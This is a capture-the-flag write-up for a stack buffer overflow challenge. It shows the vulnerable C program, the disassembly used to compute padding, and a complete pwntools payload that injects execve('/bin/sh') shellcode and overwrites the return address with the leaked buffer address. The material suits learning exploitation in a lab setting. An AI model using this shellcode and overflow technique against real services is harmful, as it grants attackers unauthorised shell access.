# Shellcode

From the title, we know that this is testing on the method of using Shellcode.

  ```C
  #include<stdio.h>

  int main(){
      setvbuf(stdout,0,2,0);

      char buf[100];
      printf( "Your input buffer address is %p\n" , buf );

      read( 0 , buf , 0x80 );

      return 0;
  }

  ```
  
As we can see from `shellcode.c`, we are able know the input buffer address and the overflow point of `buf[100]` , which is `read( 0 , buf , 0x80 )`
  
From the code, we have the idea: 
  
  1. Obtain the input buffer address
  2. Read in our shellcode
  3. Overwrite return address to buffer address to execute our shellcode
  
So, first step, to obtain input buffer address:

  ```python
  l = p.recvline()
  addr = int(l.decode('utf-8').split("0x")[1].rstrip(), 16)
   ```
Next, generate a shellcode(27 bytes) for `excve("/bin/sh\0,null,null")`.  (I got mine from [shell-storm](http://shell-storm.org/shellcode/)):

  ```python
  sh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  ```
  
And calculate our padding:

    400649:	48 8d 45 90          	lea    -0x70(%rbp),%rax
    40064d:	ba 80 00 00 00       	mov    $0x80,%edx
    400652:	48 89 c6             	mov    %rax,%rsi
    400655:	bf 00 00 00 00       	mov    $0x0,%edi
    40065a:	b8 00 00 00 00       	mov    $0x0,%eax
    40065f:	e8 7c fe ff ff       	callq  4004e0 <read@plt>
    
We can see we read to `rbp - 0x70` so our total padding will be 0x78 bytes. Thus, our padding will be 0x78 - 0x1b (27) = 0x5d
  
Third, which will be our final payload, with a padding of:

  ```python
  p.sendline( b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"\x90"*0x5d + p64(addr))
  ```
  
